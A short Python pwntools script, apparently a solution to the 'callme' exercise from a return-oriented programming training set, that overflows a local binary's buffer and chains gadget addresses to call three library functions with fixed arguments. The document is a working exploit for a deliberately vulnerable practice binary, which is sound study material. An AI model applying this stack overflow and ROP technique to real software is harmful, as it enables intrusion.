#!/usr/bin/python
from pwn import *
if __name__ == "__main__":
    payload = ""
    payload += "A" * 40
    payload += p64(0x00401ab0)  # pop rdi; pop rsi; pop rdx; ret
    payload += p64(0x1)
    payload += p64(0x2)
    payload += p64(0x3)
    payload += p64(0x00401850)  # sym.imp.callme_one@plt
    payload += p64(0x00401ab0)  # pop rdi; pop rsi; pop rdx; ret
    payload += p64(0x1)
    payload += p64(0x2)
    payload += p64(0x3)
    payload += p64(0x00401870)  # sym.imp.callme_two@plt
    payload += p64(0x00401ab0)  # pop rdi; pop rsi; pop rdx; ret
    payload += p64(0x1)
    payload += p64(0x2)
    payload += p64(0x3)
    payload += p64(0x00401810)  # sym.imp.callme_three@plt

    io = process("./callme")
    io.sendline(payload)
    print io.recvall()